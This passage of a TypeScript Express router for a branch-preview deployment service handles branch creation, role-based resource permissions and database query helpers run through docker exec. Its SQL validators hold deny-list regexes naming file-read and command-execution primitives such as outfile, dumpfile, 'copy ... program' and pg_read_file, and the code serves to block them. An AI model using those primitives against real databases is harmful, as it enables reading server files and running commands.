      if (!targetProject) {
        res.status(400).json({ error: `未知项目: ${effectiveProjectId}` });
        return;
      }

      // Branch ID scoping: legacy default keeps the bare slugified name
      // for back-compat (existing URLs, saved links). Non-legacy
      // projects auto-prefix with the project slug so two projects can
      // each register "main" without colliding — this matches the
      // already-scoped worktree layout below. The preview domain still
      // resolves via `<branchId>.miduo.org`, no extra subdomain config.
      const slugified = StateService.slugify(branch);
      const id = targetProject.legacyFlag
        ? slugified
        : `${targetProject.slug}-${slugified}`;
      // Collide on the computed id (same-project same-name in the current
      // formula) OR on the (projectId, branch) tuple — the latter catches
      // projects whose `legacyFlag` flipped after an existing branch was
      // stored under the previous formula, so we don't spawn a phantom
      // duplicate (e.g. legacy `main` + new-format `prd-agent-main` for
      // the same git branch). See .claude/rules/snapshot-fallback.md.
      const existingById = stateService.getBranch(id);
      const existingByTuple = existingById
        ? undefined
        : stateService.findBranchByProjectAndName(effectiveProjectId, branch);
      if (existingById || existingByTuple) {
        const collidingId = existingById?.id ?? existingByTuple!.id;
        res.status(409).json({ error: `分支 "${collidingId}" 已存在` });
        return;
      }

      // P4 Part 18 (G1.5): refuse deploy if the project's clone isn't
      // ready yet. Legacy projects (no cloneStatus at all) pass
      // through because they use config.repoRoot via the fallback in
      // getProjectRepoRoot — there's nothing to clone. Only G1
      // projects with an explicit cloneStatus hit this guard.
      if (targetProject.cloneStatus && targetProject.cloneStatus !== 'ready') {
        const statusMsg: Record<string, string> = {
          pending: '项目尚未开始克隆。请先 POST /api/projects/' + effectiveProjectId + '/clone',
          cloning: '项目正在克隆中，请等待完成后重试。',
          error: '项目上次克隆失败，请先重试克隆：' + (targetProject.cloneError || '未知错误'),
        };
        res.status(409).json({
          error: 'project_not_ready',
          cloneStatus: targetProject.cloneStatus,
          message: statusMsg[targetProject.cloneStatus] || `项目克隆状态异常: ${targetProject.cloneStatus}`,
        });
        return;
      }
      // G1.5 补充: 项目配置了独立 gitRepoUrl 但从未克隆（cloneStatus 为
      // undefined 说明 reposBase 未设置，willClone=false）。如果放行，
      // getProjectRepoRoot 会静默回退到 config.repoRoot，创建出错误仓库的
      // worktree。这里主动拦截，提示用户先配置 CDS_REPOS_BASE 再克隆。
      if (targetProject.gitRepoUrl && !targetProject.repoPath && !targetProject.cloneStatus) {
        res.status(409).json({
          error: 'project_repo_not_cloned',
          message: `项目配置了独立仓库（${targetProject.gitRepoUrl}），但尚未克隆。` +
            `请确保服务器已设置 CDS_REPOS_BASE 环境变量，然后通过项目设置触发克隆（POST /api/projects/${effectiveProjectId}/clone）。`,
        });
        return;
      }

      // P4 Part 18 (G1.2): resolve the git repo root for the target
      // project. Legacy 'default' projects (and any project without a
      // cloned repoPath) fall back to the globally-mounted repoRoot.
      const branchRepoRoot = stateService.getProjectRepoRoot(effectiveProjectId, config.repoRoot);
      // FU-04: nested worktree layout — `<base>/<projectId>/<slug>`.
      // Two projects sharing a branch name (e.g. "main") get their
      // own subdirectories instead of colliding.
      const worktreePath = WorktreeService.worktreePathFor(config.worktreeBase, effectiveProjectId, id);
      await shell.exec(`mkdir -p "${path.posix.dirname(worktreePath)}"`);
      await worktreeService.create(branchRepoRoot, branch, worktreePath);

      const entry: BranchEntry = {
        id,
        projectId: effectiveProjectId,
        branch,
        worktreePath,
        services: {},
        status: 'idle',
        createdAt: new Date().toISOString(),
      };
      applyProjectDefaultDeployModes(
        entry,
        targetProject.defaultDeployModes,
        stateService.getBuildProfilesForProject(effectiveProjectId),
      );
      stateService.addBranch(entry);
      // Phase 8 — 新分支自动继承项目级 defaultEnv → 写入项目级 customEnv。
      //
      // Bugbot fix(PR #521 第九轮 Bug 3)— 写回项目级 scope(撤回第八轮误改)。
      // deploy 时容器读的是 getCustomEnv(projectId),不会读 branch-scope env,
      // 写到 entry.id(branch-scope)的值实际不会被部署消费,等于白写。
      // 项目级 env 由所有分支共享,这里仅在"项目级尚无该 key"时补一次,
      // idempotent — 不会覆盖用户在项目设置里手填的值,也不会污染其它分支。
      //
      // 跨分支隔离由 db-scope-isolation.ts 的 PER_BRANCH_DB_ENV_KEYS 名单
      // 单独负责(MySQL/Postgres DB 名按分支后缀化),不靠这里的 scope 选择。
      const defaultEnv = stateService.getDefaultEnv(effectiveProjectId);
      if (Object.keys(defaultEnv).length > 0) {
        const existingProjectEnv = stateService.getCustomEnvScope(effectiveProjectId);
        for (const [k, v] of Object.entries(defaultEnv)) {
          if (!(k in existingProjectEnv) && v) {
            stateService.setCustomEnvVar(k, v, effectiveProjectId);
          }
        }
      }
      stateService.save();

      // Live UI: notify open dashboards that a branch just got added
      // manually so their card list animates in without a page refresh.
      branchEvents.emitEvent({
        type: 'branch.created',
        payload: { branch: entry, source: 'manual', ts: nowIso() },
      });

      res.status(201).json({ branch: entry });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Branch detail (GET /branches/:id) ──
  //
  // F9 fix (2026-05-02 onboarding UAT): the React dashboard's "Branch panel"
  // page tried to fetch `GET /api/branches/<id>` for a single-branch view but
  // CDS only exposed list / sub-resource endpoints (`GET /branches`,
  // `GET /branches/:id/logs`, etc.). Express returned the static
  // `/index.html` fallback as HTML, which the React loader interpreted as
  // an opaque success → blank panel. Now we return a typed JSON envelope
  // so the panel can render or 404 explicitly.
  //
  // Auth: respects the same project-key scope guard as the list endpoint —
  // a key minted for project A cannot peek into branches of project B even
  // if it knows the id. Bootstrap key + cookie auth pass through unchanged.
  //
  // IMPORTANT: this route must stay below the literal-path routes
  // `GET /branches/stream` (953) and `GET /branches` (1011) so Express
  // resolves them first. Sub-resource routes like `GET /branches/:id/logs`
  // use a different method+path so do not conflict.
  router.get('/branches/:id', (req, res) => {
    const { id } = req.params;
    const branch = stateService.getBranch(id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    const m = assertProjectAccess(req as any, branch.projectId || 'default');
    if (m) {
      res.status(m.status).json(m.body);
      return;
    }
    res.json({ branch: branchForView(branch) });
  });

  router.get('/branches/:id/resources', async (req, res) => {
    const { id } = req.params;
    const branch = stateService.getBranch(id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) {
      res.status(m.status).json(m.body);
      return;
    }

    const live = req.query.live === 'true' || req.query.live === '1';
    const infraServices = stateService.getInfraServicesForProject(projectId);
    if (live) {
      const runningNames = await containerService.getRunningContainerNames();
      for (const [profileId, svc] of Object.entries(branch.services || {})) {
        if (svc.status === 'running' && !runningNames.has(svc.containerName)) {
          svc.status = 'stopped';
          branch.services[profileId] = svc;
        }
      }
      for (const svc of infraServices) {
        if (svc.status === 'running' && !runningNames.has(svc.containerName)) {
          svc.status = 'stopped';
        }
      }
      reconcileBranchStatus(branch);
      stateService.save();
    }

    const previewHost = (config.previewDomain || config.rootDomains?.[0] || '').replace(/^https?:\/\//, '').replace(/\/+$/, '');
    const preview = branch.branch
      ? buildPreviewUrlForProject(previewHost, branch.branch, stateService.getProject(projectId), projectId)
      : undefined;
    const previewUrl = preview?.url || '';
    const resources = buildUnifiedBranchResources({
      branch,
      profiles: stateService.getEffectiveProfilesForBranch(branch),
      infraServices,
      externalAccessPolicies: await getActiveResourceExternalAccessForBranch(projectId, branch),
      cloneTasks: stateService.listResourceCloneTasks({ projectId, branchId: branch.id }),
      previewUrl,
      publicHost: previewHost,
    });
    res.json({
      branchId: branch.id,
      branchName: branch.branch,
      projectId,
      resources,
    });
  });

  function resourcePublicHost(): string {
    return (config.previewDomain || config.rootDomains?.[0] || '')
      .replace(/^https?:\/\//, '')
      .replace(/\/+$/, '');
  }

  function hasProjectScopedOrCookieAuth(req: Request, projectId: string): boolean {
    const projKey = (req as any).cdsProjectKey as { projectId: string } | undefined;
    const cookieAuth = (req as any)._cdsCookieAuth === true;
    return cookieAuth || Boolean(projKey && projKey.projectId === projectId);
  }

  function requireSecretRevealAccess(req: Request, res: Response, projectId: string): boolean {
    if (hasProjectScopedOrCookieAuth(req, projectId)) return true;
    res.status(403).json({
      error: 'forbidden_secret_reveal',
      reason: 'connection string reveal requires project-scoped key (cdsp_) or human cookie session',
      projectId,
      hint: '请在该项目下「授权 Agent」生成 cdsp_ 项目级 key，或使用已登录 CDS 控制台的人工会话。静态 AI_ACCESS_KEY 与 cdsg_ 全局 key 不允许读取明文连接串。',
    });
    return false;
  }

  type ResourcePermissionRole = 'member' | 'developer' | 'admin';
  type ResourcePermissionAction =
    | 'resource-restart'
    | 'external-temporary-access'
    | 'external-policy-admin'
    | 'database-clone'
    | 'database-connect-existing'
    | 'backup-create'
    | 'backup-restore'
    | 'credentials-reset'
    | 'connection-inject'
    | 'data-clear'
    | 'data-write'
    | 'resource-delete';

  function resolveResourcePermissionRole(req: Request): ResourcePermissionRole {
    const explicit = String(
      (req as any).workspaceMember?.role
        || (req as any).user?.role
        || (req as any).cdsUser?.role
        || '',
    ).toLowerCase();
    if (explicit === 'owner' || explicit === 'admin') return 'admin';
    if (explicit === 'developer' || explicit === 'dev') return 'developer';
    if (explicit === 'member' || explicit === 'viewer' || explicit === 'read-only') return 'member';
    if ((req as any)._cdsCookieAuth === true) return 'admin';
    if ((req as any).cdsProjectKey) return 'developer';
    if ((req as any)._aiSession) return 'developer';
    return 'member';
  }

  function resourcePermissionRank(role: ResourcePermissionRole): number {
    return role === 'admin' ? 3 : role === 'developer' ? 2 : 1;
  }

  function isProductionLikeResource(branch: BranchEntry, resource: UnifiedBranchResource): boolean {
    const raw = `${branch.branch} ${resource.displayName} ${resource.serviceName}`.toLowerCase();
    return /\b(prod|production|main|master)\b/.test(raw);
  }

  function requiredResourceRole(action: ResourcePermissionAction, branch: BranchEntry, resource: UnifiedBranchResource): ResourcePermissionRole {
    if (
      action === 'backup-restore'
      || action === 'database-connect-existing'
      || action === 'external-policy-admin'
      || action === 'data-clear'
      || action === 'data-write'
      || action === 'resource-delete'
    ) {
      return 'admin';
    }
    if (action === 'external-temporary-access' && isProductionLikeResource(branch, resource)) {
      return 'admin';
    }
    return 'developer';
  }

  function requireResourcePermission(
    req: Request,
    res: Response,
    action: ResourcePermissionAction,
    branch: BranchEntry,
    resource: UnifiedBranchResource,
  ): boolean {
    const role = resolveResourcePermissionRole(req);
    const required = requiredResourceRole(action, branch, resource);
    if (resourcePermissionRank(role) >= resourcePermissionRank(required)) return true;
    res.status(403).json({
      error: 'resource_permission_denied',
      action,
      role,
      requiredRole: required,
      message: `当前角色 ${role} 不能执行 ${action}，需要 ${required} 权限。`,
    });
    return false;
  }

  function buildResourcePermissionSummary(req: Request, branch: BranchEntry, resource: UnifiedBranchResource): {
    role: ResourcePermissionRole;
    productionLike: boolean;
    actions: Record<ResourcePermissionAction, { allowed: boolean; requiredRole: ResourcePermissionRole; reason?: string }>;
  } {
    const role = resolveResourcePermissionRole(req);
    const rank = resourcePermissionRank(role);
    const actions = [
      'resource-restart',
      'external-temporary-access',
      'external-policy-admin',
      'database-clone',
      'database-connect-existing',
      'backup-create',
      'backup-restore',
      'credentials-reset',
      'connection-inject',
      'data-clear',
      'data-write',
      'resource-delete',
    ] as const satisfies readonly ResourcePermissionAction[];
    const result = {} as Record<ResourcePermissionAction, { allowed: boolean; requiredRole: ResourcePermissionRole; reason?: string }>;
    for (const action of actions) {
      const requiredRole = requiredResourceRole(action, branch, resource);
      const allowed = rank >= resourcePermissionRank(requiredRole);
      result[action] = {
        allowed,
        requiredRole,
        ...(allowed ? {} : { reason: `当前角色 ${role} 需要 ${requiredRole} 权限才能执行 ${action}` }),
      };
    }
    return {
      role,
      productionLike: isProductionLikeResource(branch, resource),
      actions: result,
    };
  }

  function decodeResourceId(raw: string): string {
    try { return decodeURIComponent(raw); } catch { return raw; }
  }

  function resourceRuntimeKey(runtime: string): 'mysql' | 'postgres' | 'mongodb' | 'redis' | 'unknown' {
    const lower = runtime.toLowerCase();
    if (lower.includes('mysql') || lower.includes('mariadb')) return 'mysql';
    if (lower.includes('postgres')) return 'postgres';
    if (lower.includes('mongo')) return 'mongodb';
    if (lower.includes('redis')) return 'redis';
    return 'unknown';
  }

  type ResourceWorkbenchRuntimeKey = 'mysql' | 'postgres' | 'sqlserver' | 'mongodb' | 'redis' | 'rabbitmq' | 'unknown';

  interface ResourceWorkbenchCapability {
    runtimeKey: ResourceWorkbenchRuntimeKey;
    runtime: 'sql' | 'document' | 'keyValue' | 'queue' | 'unsupported';
    runner: 'sql' | 'mongo' | 'redis-readonly' | 'planned';
    treeLabel: string;
    consoleLabel: string;
    commandLanguage: 'sql' | 'mongo' | 'redis' | 'rabbitmq' | 'text';
    resultModes: Array<'table' | 'json' | 'output'>;
    defaultCommand: string;
    ready: boolean;
    writeSupported: boolean;
    customPanels: string[];
    note: string;
  }

  function resourceWorkbenchRuntimeKey(runtime: string): ResourceWorkbenchRuntimeKey {
    const lower = runtime.toLowerCase();
    if (lower.includes('mysql') || lower.includes('mariadb')) return 'mysql';
    if (lower.includes('postgres')) return 'postgres';
    if (lower.includes('sql server') || lower.includes('mssql') || lower.includes('sqlserver')) return 'sqlserver';
    if (lower.includes('mongo')) return 'mongodb';
    if (lower.includes('redis')) return 'redis';
    if (lower.includes('rabbit')) return 'rabbitmq';
    return 'unknown';
  }

  function resourceWorkbenchCapability(runtime: string): ResourceWorkbenchCapability {
    const runtimeKey = resourceWorkbenchRuntimeKey(runtime);
    if (runtimeKey === 'mysql' || runtimeKey === 'postgres') {
      return {
        runtimeKey,
        runtime: 'sql',
        runner: 'sql',
        treeLabel: '数据库 / 表',
        consoleLabel: 'SQL Console',
        commandLanguage: 'sql',
        resultModes: ['table', 'json', 'output'],
        defaultCommand: 'SELECT * FROM <table> LIMIT 50',
        ready: true,
        writeSupported: true,
        customPanels: ['schema', 'ddl', 'backup'],
        note: 'SQL 系资源共用统一工作台协议，DDL/DML 由 data-write 权限和审计保护。',
      };
    }
    if (runtimeKey === 'sqlserver') {
      return {
        runtimeKey,
        runtime: 'sql',
        runner: 'planned',
        treeLabel: '数据库 / schema / 表',
        consoleLabel: 'T-SQL Console',
        commandLanguage: 'sql',
        resultModes: ['table', 'json', 'output'],
        defaultCommand: 'SELECT TOP 50 * FROM <table>;',
        ready: false,
        writeSupported: false,
        customPanels: ['schema', 'ddl', 'backup'],
        note: 'SQL Server for Linux 已进入工作台协议，执行器需要 sqlcmd/mssql-tools 后接入。',
      };
    }
    if (runtimeKey === 'mongodb') {
      return {
        runtimeKey,
        runtime: 'document',
        runner: 'mongo',
        treeLabel: '数据库 / collection',
        consoleLabel: 'MongoDB Console',
        commandLanguage: 'mongo',
        resultModes: ['table', 'json', 'output'],
        defaultCommand: 'db.getCollection("<collection>").find({}).limit(50);',
        ready: true,
        writeSupported: true,
        customPanels: ['collection', 'index', 'document'],
        note: '文档型资源共用统一工作台协议，collection 选择只生成默认命令。',
      };
    }
    if (runtimeKey === 'redis') {
      return {
        runtimeKey,
        runtime: 'keyValue',
        runner: 'redis-readonly',
        treeLabel: 'DB / key',
        consoleLabel: 'Redis Console',
        commandLanguage: 'redis',
        resultModes: ['json', 'output'],
        defaultCommand: 'GET <key>',
        ready: true,
        writeSupported: false,
        customPanels: ['string', 'hash', 'list', 'set', 'zset', 'stream'],
        note: 'Redis 先保留只读 key 浏览，后续在同一协议下补命令执行和结构化编辑。',
      };
    }
    if (runtimeKey === 'rabbitmq') {
      return {
        runtimeKey,
        runtime: 'queue',
        runner: 'planned',
        treeLabel: 'vhost / exchange / queue / binding',
        consoleLabel: 'RabbitMQ Command',
        commandLanguage: 'rabbitmq',
        resultModes: ['table', 'json', 'output'],
        defaultCommand: 'list queues',
        ready: false,
        writeSupported: false,
        customPanels: ['queue', 'exchange', 'binding', 'message'],
        note: 'RabbitMQ 已进入工作台协议，后续接入 list / peek / publish / purge 等动作命令。',
      };
    }
    return {
      runtimeKey,
      runtime: 'unsupported',
      runner: 'planned',
      treeLabel: '资源树',
      consoleLabel: 'Command',
      commandLanguage: 'text',
      resultModes: ['json', 'output'],
      defaultCommand: '',
      ready: false,
      writeSupported: false,
      customPanels: [],
      note: '该资源尚未声明数据工作台执行器。',
    };
  }

  function sqlIdent(name: string): string {
    return `\`${name.replace(/`/g, '``')}\``;
  }

  function pgIdent(name: string): string {
    return `"${name.replace(/"/g, '""')}"`;
  }

  function pgString(value: string): string {
    return `'${value.replace(/'/g, "''")}'`;
  }

  function sqlString(value: string): string {
    return `'${value.replace(/\\/g, '\\\\').replace(/'/g, "\\'")}'`;
  }

  function branchDatabaseName(base: string, branch: BranchEntry): string {
    const prefix = (base || 'app').replace(/[^a-zA-Z0-9_]/g, '_').slice(0, 32) || 'app';
    const suffix = StateService.slugify(branch.branch || branch.id).replace(/-/g, '_').slice(0, 28) || branch.id.slice(0, 8);
    return `${prefix}_${suffix}`.slice(0, 64);
  }

  function branchDatabaseUser(branch: BranchEntry): string {
    return `cds_${StateService.slugify(branch.id).replace(/-/g, '_').slice(0, 24)}`.slice(0, 32);
  }

  interface MysqlBranchDatabaseResult {
    branchUser: string;
    branchPassword: string;
    database: string;
    internalHost: string;
    internalPort: number;
    databaseUrl: string;
    injectedEnv: Record<string, string>;
    maskedInjectedEnv: Record<string, string>;
  }

  interface ResourceBackupEntry {
    id: string;
    name: string;
    sizeBytes: number;
    createdAt: string;
    runtime: string;
    database?: string;
  }

  interface MysqlConnectionEnvResult {
    branchUser: string;
    branchPassword: string;
    database: string;
    internalHost: string;
    internalPort: number;
    injectedEnv: Record<string, string>;
    maskedInjectedEnv: Record<string, string>;
  }

  type ResourceDatabaseRuntime = 'mysql' | 'postgres' | 'mongodb' | 'redis';

  interface DbDataQueryResult {
    columns: string[];
    rows: string[][];
    rowCount: number;
  }

  interface SqlTableRef {
    schema?: string;
    table: string;
  }

  type SqlDataRuntime = 'mysql' | 'postgres';

  function resolvedInfraEnv(service: InfraService, branch?: BranchEntry): Record<string, string> {
    const projectId = service.projectId || branch?.projectId || 'default';
    const vars = branch ? getMergedEnv(projectId, branch.id) : stateService.getCustomEnv(projectId);
    return resolveEnvTemplates(service.env || {}, vars);
  }

  function resolvedServiceDbName(service: InfraService): string {
    const dbName = String(service.dbName || '').trim();
    return dbName.includes('${') ? '' : dbName;
  }

  function mysqlRootPassword(service: InfraService, branch?: BranchEntry): string {
    const env = resolvedInfraEnv(service, branch);
    return env.MYSQL_ROOT_PASSWORD
      || env.MARIADB_ROOT_PASSWORD
      || env.MYSQL_PASSWORD
      || '';
  }

  function mysqlPasswordArg(password: string): string {
    return password ? ` -p${shq(password)}` : '';
  }

  function maskTextSecrets(textValue: string, secrets: string[]): string {
    let masked = textValue;
    for (const secret of secrets) {
      if (secret && secret.length >= 3) masked = masked.split(secret).join('******');
    }
    return masked;
  }

  function mysqlClientCredentials(service: InfraService, branch: BranchEntry): { user: string; password: string; database: string; secrets: string[] } {
    const branchEnv = stateService.getCustomEnvScope(branch.id);
    const env = resolvedInfraEnv(service, branch);
    const database = mysqlDatabaseForBranch(service, branch);
    const branchUser = branchEnv.MYSQL_USER || '';
    const branchPassword = branchEnv.MYSQL_PASSWORD || '';
    if (branchUser && branchPassword) {
      return { user: branchUser, password: branchPassword, database, secrets: [branchPassword] };
    }
    const rootPassword = mysqlRootPassword(service, branch);
    const user = env.MYSQL_USER || env.MARIADB_USER || 'root';
    const password = env.MYSQL_USER || env.MARIADB_USER
      ? (env.MYSQL_PASSWORD || env.MARIADB_PASSWORD || rootPassword)
      : rootPassword;
    return { user, password, database, secrets: [password] };
  }

  function parseDbTsv(stdout: string): DbDataQueryResult {
    const lines = stdout.replace(/\r\n/g, '\n').split('\n').filter((line) => line.length > 0);
    if (lines.length === 0) return { columns: [], rows: [], rowCount: 0 };
    const columns = lines[0].split('\t');
    const rows = lines.slice(1).map((line) => line.split('\t'));
    return { columns, rows, rowCount: rows.length };
  }

  function normalizeReadOnlySql(sql: string): string {
    const trimmed = sql.trim();
    if (!trimmed) throw new Error('SQL 不能为空');
    if (trimmed.length > 20_000) throw new Error('SQL 过长（上限 20KB）');
    const withoutTrailing = trimmed.replace(/;+$/g, '').trim();
    if (withoutTrailing.includes(';')) {
      throw new Error('只读 SQL Console 一次只允许执行一条语句');
    }
    const head = withoutTrailing.match(/^\s*([a-z]+)/i)?.[1]?.toLowerCase() || '';
    if (!['select', 'show', 'describe', 'desc', 'explain'].includes(head)) {
      throw new Error('第一阶段 SQL Console 只允许 SELECT / SHOW / DESCRIBE / EXPLAIN');
    }
    // 危险关键字检查必须覆盖全部放行语句头，不只 select：PostgreSQL 的
    // EXPLAIN ANALYZE UPDATE ... 会真实执行底层 UPDATE，仅查 select 头会被
    // 绕过 /data/query-write 的 data-write 权限与确认门（PR #799 Codex P1）
    if (/\b(insert|update|delete|drop|alter|create|truncate|replace|grant|revoke|call|set|use|load|outfile|dumpfile|lock|unlock)\b/i.test(withoutTrailing)) {
      throw new Error('检测到写入或高风险关键字，已拒绝执行');
    }
    return withoutTrailing;
  }

  function normalizeDangerousWriteSql(sql: string): string {
    const trimmed = sql.trim();
    if (!trimmed) throw new Error('SQL 不能为空');
    if (trimmed.length > 20_000) throw new Error('SQL 过长（上限 20KB）');
    const withoutTrailing = trimmed.replace(/;+$/g, '').trim();
    if (withoutTrailing.includes(';')) {
      throw new Error('写 SQL 一次只允许执行一条语句');
    }
    const head = withoutTrailing.match(/^\s*([a-z]+)/i)?.[1]?.toLowerCase() || '';
    if (!['insert', 'update', 'delete', 'create', 'alter', 'drop', 'truncate', 'replace'].includes(head)) {
      throw new Error('写 SQL 只允许 INSERT / UPDATE / DELETE / CREATE / ALTER / DROP / TRUNCATE / REPLACE');
    }
    if (/\b(grant|revoke|load\s+data|outfile|dumpfile|copy\s+.*program|pg_read_file|pg_ls_dir)\b/i.test(withoutTrailing)) {
      throw new Error('检测到权限或文件系统高风险 SQL，已拒绝执行');
    }
    return withoutTrailing;
  }

  async function runMysqlDataQuery(service: InfraService, branch: BranchEntry, sql: string, timeoutMs = 30_000): Promise<DbDataQueryResult> {
    if (service.status !== 'running') {
      throw new Error(`MySQL 服务当前未运行（status=${service.status}）`);
    }
    const creds = mysqlClientCredentials(service, branch);
    if (!creds.database || !/^[a-zA-Z0-9_]+$/.test(creds.database)) {
      throw new Error(`数据库名不合法: ${creds.database || '(empty)'}`);
    }
    const result = await shell.exec(
      `docker exec ${shq(service.containerName || '')} mysql -u${shq(creds.user)}${mysqlPasswordArg(creds.password)} --batch --raw --default-character-set=utf8mb4 ${shq(creds.database)} -e ${shq(sql)}`,
      { timeout: timeoutMs },
    );
    if (result.exitCode !== 0) {
      throw new Error(maskTextSecrets((result.stderr || result.stdout || 'MySQL 查询失败').trim(), creds.secrets));
    }
    return parseDbTsv(maskTextSecrets(result.stdout, creds.secrets));
  }

  function postgresDatabaseForBranch(service: InfraService, branch: BranchEntry): string {
    const branchEnv = stateService.getCustomEnvScope(branch.id);
    const env = resolvedInfraEnv(service, branch);
    return String(
      branchEnv.POSTGRES_DB
        || env.POSTGRES_DB
        || resolvedServiceDbName(service)
        || env.POSTGRES_USER
        || 'postgres',
    )
      .replace(/[^a-zA-Z0-9_]/g, '_')
      .slice(0, 63);
  }

  function postgresClientCredentials(service: InfraService, branch: BranchEntry): { user: string; password: string; database: string; secrets: string[] } {
    const branchEnv = stateService.getCustomEnvScope(branch.id);
    const env = resolvedInfraEnv(service, branch);
    const user = branchEnv.POSTGRES_USER || env.POSTGRES_USER || 'postgres';
    const password = branchEnv.POSTGRES_PASSWORD || env.POSTGRES_PASSWORD || '';
    return { user, password, database: postgresDatabaseForBranch(service, branch), secrets: [password] };
  }

  async function runPostgresDataQuery(service: InfraService, branch: BranchEntry, sql: string, timeoutMs = 30_000): Promise<DbDataQueryResult> {
    if (service.status !== 'running') {
      throw new Error(`PostgreSQL 服务当前未运行（status=${service.status}）`);
    }
    const creds = postgresClientCredentials(service, branch);
    if (!creds.database || !/^[a-zA-Z0-9_]+$/.test(creds.database)) {
      throw new Error(`数据库名不合法: ${creds.database || '(empty)'}`);
    }
    const result = await shell.exec(
      `docker exec -e PGPASSWORD=${shq(creds.password)} ${shq(service.containerName || '')} psql -U ${shq(creds.user)} -d ${shq(creds.database)} -A -F ${shq('\t')} -P footer=off -X -q -c ${shq(sql)}`,
      { timeout: timeoutMs },
    );
    if (result.exitCode !== 0) {
      throw new Error(maskTextSecrets((result.stderr || result.stdout || 'PostgreSQL 查询失败').trim(), creds.secrets));
    }
    return parseDbTsv(maskTextSecrets(result.stdout, creds.secrets));
  }

  async function runSqlDataQuery(runtime: SqlDataRuntime, service: InfraService, branch: BranchEntry, sql: string, timeoutMs = 30_000): Promise<DbDataQueryResult> {
    return runtime === 'postgres'
      ? runPostgresDataQuery(service, branch, sql, timeoutMs)
      : runMysqlDataQuery(service, branch, sql, timeoutMs);
  }

  async function runSqlDataInitScript(runtime: SqlDataRuntime, service: InfraService, branch: BranchEntry, sql: string): Promise<{ exitCode: number; output: string; error: string | null; truncated: boolean }> {
    const trimmed = sql.trim();
    if (!trimmed) throw new Error('初始化 SQL 不能为空');
    if (trimmed.length > 100_000) throw new Error('初始化 SQL 过长（上限 100KB）');
    const database = sqlDataDatabase(runtime, service, branch);
    if (!database || !/^[a-zA-Z0-9_]+$/.test(database)) {
      throw new Error(`数据库名不合法: ${database || '(empty)'}`);
    }
    const command = runtime === 'postgres'
      ? (() => {
        const creds = postgresClientCredentials(service, branch);
        return {
          command: `printf %s ${shq(trimmed)} | docker exec -i -e PGPASSWORD=${shq(creds.password)} ${shq(service.containerName || '')} psql -U ${shq(creds.user)} -d ${shq(creds.database)} -v ON_ERROR_STOP=1 -P pager=off`,
          secrets: creds.secrets,
        };
      })()
      : (() => {
        const creds = mysqlClientCredentials(service, branch);
        return {
          command: `printf %s ${shq(trimmed)} | docker exec -i ${shq(service.containerName || '')} mysql -u${shq(creds.user)}${mysqlPasswordArg(creds.password)} --default-character-set=utf8mb4 ${shq(creds.database)}`,
          secrets: creds.secrets,
        };
      })();
    const result = await shell.exec(command.command, { timeout: 120_000 });
    const rawOutput = result.stdout || '';
    const rawError = result.stderr || '';
    const output = maskTextSecrets(rawOutput.slice(0, 256 * 1024), command.secrets);
    const error = maskTextSecrets(rawError.slice(0, 16 * 1024), command.secrets);
    return {
      exitCode: result.exitCode,
      output,
      error: result.exitCode === 0 ? null : (error || output || '初始化 SQL 执行失败'),
      truncated: rawOutput.length > 256 * 1024 || rawError.length > 16 * 1024,
    };
  }

  function sqlDataDatabase(runtime: SqlDataRuntime, service: InfraService, branch: BranchEntry): string {
    return runtime === 'postgres'
      ? postgresDatabaseForBranch(service, branch)
      : mysqlDatabaseForBranch(service, branch);
  }

  function tableNameFromRequest(input: unknown): string {
    const value = String(input || '').trim();
    if (!value || !/^[a-zA-Z0-9_$]+$/.test(value)) {
      throw new Error('表名不合法');
    }
    return value;
  }

  function sqlSchemaFromRequest(input: unknown): string | undefined {
    const value = String(input || '').trim();
    if (!value) return undefined;
    if (!/^[a-zA-Z0-9_$]+$/.test(value)) {
      throw new Error('schema 名不合法');
    }
    return value;
  }

  function sqlTableRefFromRequest(tableInput: unknown, schemaInput: unknown): SqlTableRef {
    return {
      schema: sqlSchemaFromRequest(schemaInput),
      table: tableNameFromRequest(tableInput),
    };
  }

  function sqlTableIdent(runtime: SqlDataRuntime, ref: SqlTableRef): string {
    if (runtime === 'postgres') {
      return ref.schema ? `${pgIdent(ref.schema)}.${pgIdent(ref.table)}` : pgIdent(ref.table);
    }
    return sqlIdent(ref.table);
  }

  function redisPassword(service: InfraService): string {
    const env = resolvedInfraEnv(service);
    return env.REDIS_PASSWORD || env.REDIS_PASS || env.REDISCLI_AUTH || '';
  }

  function mongoDatabaseForBranch(service: InfraService, branch: BranchEntry): string {
    const branchEnv = stateService.getCustomEnvScope(branch.id);
    const env = resolvedInfraEnv(service, branch);
    return String(
      branchEnv.MONGO_INITDB_DATABASE
        || branchEnv.MONGODB_DATABASE
        || service.dbName
        || env.MONGO_INITDB_DATABASE
        || 'app',
    )
      .replace(/[^a-zA-Z0-9_-]/g, '_')
      .slice(0, 63);
  }

  function mongoDatabaseFromRequest(input: unknown, fallback: string): string {
    const value = String(input || fallback || '').trim();
    if (!value || !/^[a-zA-Z0-9_-]{1,63}$/.test(value)) {
      throw new Error(`MongoDB database 名不合法：${value || '(empty)'}`);
    }
    return value;
  }

  function chooseMongoCurrentDatabase(configuredDatabase: string, databases: unknown[]): string {
    const validDatabases = databases
      .map((item) => (item && typeof item === 'object' && 'name' in item ? String((item as { name?: unknown }).name || '') : ''))
      .filter((name) => /^[a-zA-Z0-9_-]{1,63}$/.test(name));
    if (validDatabases.includes(configuredDatabase)) return configuredDatabase;
    const businessDatabase = validDatabases.find((name) => !['admin', 'config', 'local'].includes(name));
    return businessDatabase || validDatabases[0] || configuredDatabase;
  }

  function mongoCredentials(service: InfraService, branch: BranchEntry, databaseOverride?: string): { user: string; password: string; database: string; uri: string; secrets: string[] } {
    const branchEnv = stateService.getCustomEnvScope(branch.id);
    const env = resolvedInfraEnv(service, branch);
    const branchUser = branchEnv.MONGODB_USERNAME || branchEnv.MONGO_USERNAME || '';
    const user = branchEnv.MONGO_INITDB_ROOT_USERNAME
      || branchUser
      || env.MONGO_INITDB_ROOT_USERNAME
      || env.MONGO_USERNAME
      || env.MONGODB_USERNAME
      || '';
    const password = branchEnv.MONGO_INITDB_ROOT_PASSWORD
      || branchEnv.MONGODB_PASSWORD
      || env.MONGO_INITDB_ROOT_PASSWORD
      || env.MONGO_PASSWORD
      || env.MONGODB_PASSWORD
      || '';
    const database = databaseOverride || mongoDatabaseForBranch(service, branch);
    const authSourceDb = user
